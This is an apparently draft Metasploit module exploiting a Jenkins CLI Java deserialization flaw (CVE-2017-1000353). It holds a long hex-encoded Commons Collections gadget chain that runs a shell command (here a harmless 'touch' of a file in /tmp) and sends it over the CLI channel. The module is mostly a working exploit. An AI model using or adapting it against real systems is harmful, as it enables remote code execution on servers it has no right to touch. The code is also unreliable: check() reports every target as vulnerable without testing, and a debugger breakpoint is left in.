##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::HttpClient
  prepend Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Jenkins CLI Deserialization',
        'Description'    => %q(
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
        [
          'Unknown',     # Vulnerability discovery
          'Shelby Pace'  # Metasploit module
        ],
        'References'     =>
          [
            [ 'URL', 'https://www.jenkins.io/security/advisory/2017-04-26/'],
            [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-unauthenticated-code-execution/'],
            [ 'CVE', '2017-1000353']
          ],
        'Payload'        =>
          {
          },
        'Platform'  => 'linux',
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'Targets'        =>
          [
            [
              'Linux',
              {
                'Platform'  => 'linux',
                'Arch'  => [ ARCH_X86, ARCH_X64 ]
              }
            ]
          ],
        'DisclosureDate' => "2017-04-26",
        'DefaultTarget'  => 0
      )
    )

    register_options(
    [
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [ true, 'The base path to Jenkins', '/' ])
    ])
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def exploit
    sess_uri = normalize_uri(target_uri.path, 'cli')
    sess_uuid = SecureRandom.uuid

    download_res = send_request_cgi(
      'uri'     =>  sess_uri,
      'method'  =>  'POST',
      'headers' =>
      {
        'Side'    =>  'download',
        'Session' =>  sess_uuid
      }
    )
    # need to initialize the channel of communication
    # with the upload / download requests
require 'pry';binding.pry
    fail_with(Failure::NotFound, 'Unable to open channel to CLI') unless download_res
    unless download_res.body.include?('Starting HTTP duplex channel')
      fail_with(Failure::UnexpectedReply, 'Failed to initialize channel')
    end
    print_good('Successfully set up channel to CLI component')
    preamble = '<===[JENKINS REMOTING CAPACITY]===>'
    preamble << 'rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    sploit = "aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e636f6c"\
              "6c656374696f6e732e6d61702e5265666572656e63654d61701594ca0398"\
              "4908d7030000787077110000000000000001003f40000000000010737200"\
              "286a6176612e7574696c2e636f6e63757272656e742e436f70794f6e5772"\
              "69746541727261795365744bbdd092901569d70200014c0002616c74002b"\
              "4c6a6176612f7574696c2f636f6e63757272656e742f436f70794f6e5772"\
              "69746541727261794c6973743b7870737200296a6176612e7574696c2e63"\
              "6f6e63757272656e742e436f70794f6e577269746541727261794c697374"\
              "785d9fd546ab90c303000078707704000000027372002a6a6176612e7574"\
              "696c2e636f6e63757272656e742e436f6e63757272656e74536b69704c69"\
              "7374536574dd985079bdcff15b0200014c00016d74002d4c6a6176612f75"\
              "74696c2f636f6e63757272656e742f436f6e63757272656e744e61766967"\
              "61626c654d61703b78707372002a6a6176612e7574696c2e636f6e637572"\
              "72656e742e436f6e63757272656e74536b69704c6973744d6170884675ae"\
              "061146a70300014c000a636f6d70617261746f727400164c6a6176612f75"\
              "74696c2f436f6d70617261746f723b7870707372001a6a6176612e736563"\
              "75726974792e5369676e65644f626a65637409ffbd682a3cd5ff0200035b"\
              "0007636f6e74656e747400025b425b00097369676e617475726571007e00"\
              "0e4c000c746865616c676f726974686d7400124c6a6176612f6c616e672f"\
              "537472696e673b7870757200025b42acf317f8060854e002000078700000"\
              "050caced0005737200116a6176612e7574696c2e48617368536574ba4485"\
              "9596b8b7340300007870770c000000023f40000000000001737200346f72"\
              "672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b"\
              "657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200"\
              "024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00"\
              "036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f"\
              "7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374"\
              "696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007"\
              "666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f"\
              "636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a"\
              "6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e73"\
              "2e66756e63746f72732e436861696e65645472616e73666f726d657230c7"\
              "97ec287a97040200015b000d695472616e73666f726d65727374002d5b4c"\
              "6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e73"\
              "2f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368"\
              "652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f72"\
              "6d65723bbd562af1d83418990200007870000000057372003b6f72672e61"\
              "70616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63"\
              "746f72732e436f6e7374616e745472616e73666f726d6572587690114102"\
              "b1940200014c000969436f6e7374616e7471007e00037870767200116a61"\
              "76612e6c616e672e52756e74696d65000000000000000000000078707372"\
              "003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f"\
              "6e732e66756e63746f72732e496e766f6b65725472616e73666f726d6572"\
              "87e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c"\
              "616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a"\
              "6176612f6c616e672f537472696e673b5b000b69506172616d5479706573"\
              "7400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a"\
              "6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000"\
              "00000274000a67657452756e74696d65757200125b4c6a6176612e6c616e"\
              "672e436c6173733bab16d7aecbcd5a990200007870000000007400096765"\
              "744d6574686f647571007e001b00000002767200106a6176612e6c616e67"\
              "2e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e"\
              "00137571007e001800000002707571007e001800000000740006696e766f"\
              "6b657571007e001b00000002767200106a6176612e6c616e672e4f626a65"\
              "6374000000000000000000000078707671007e00187371007e0013757200"\
              "135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200"\
              "00787000000001740013746f756368202f746d702f626c6168424c414874"\
              "0004657865637571007e001b0000000171007e00207371007e000f737200"\
              "116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149"\
              "000576616c7565787200106a6176612e6c616e672e4e756d62657286ac95"\
              "1d0b94e08b020000787000000001737200116a6176612e7574696c2e4861"\
              "73684d61700507dac1c31660d103000246000a6c6f6164466163746f7249"\
              "00097468726573686f6c6478703f40000000000000770800000010000000"\
              "007878787571007e00110000002e302c02142691de032cde032535a00199"\
              "bd642cc09488cd2402143a9f885e6d7a11aaf2ee501b1a9a21254d09df96"\
              "740003445341737200116a6176612e6c616e672e426f6f6c65616ecd2072"\
              "80d59cfaee0200015a000576616c75657870017078737200316f72672e61"\
              "70616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e7365742e"\
              "4c6973744f726465726564536574fcd39ef6fa1ced530200014c00087365"\
              "744f726465727400104c6a6176612f7574696c2f4c6973743b787200436f"\
              "72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e"\
              "7365742e416273747261637453657269616c697a61626c65536574446563"\
              "6f7261746f72110ff46b96170e1b0300007870737200156e65742e73662e"\
              "6a736f6e2e4a534f4e41727261795d01546f5c2872d20200025a000e6578"\
              "70616e64456c656d656e74734c0008656c656d656e747371007e00187872"\
              "00186e65742e73662e6a736f6e2e41627374726163744a534f4ee88a13f4"\
              "f69b3f82020000787000737200136a6176612e7574696c2e41727261794c"\
              "6973747881d21d99c7619d03000149000473697a65787000000001770400"\
              "0000017400046173646678787371007e001e000000007704000000007878"\
              "71007e00207371007e00027371007e000577040000000271007e001a7100"\
              "7e00097871007e00207078"
    sploit = [sploit].pack('H*')

    print_status('Sending exploit...')
    upload_res = send_request_cgi(
      'uri'     =>  sess_uri,
      'method'  =>  'POST',
      'data'    =>  preamble+sploit,
      'headers' =>
      {
        'Side'    =>  'upload',
        'Session' =>  sess_uuid
      }
    )
    print_status(upload_res.code)
  end
end
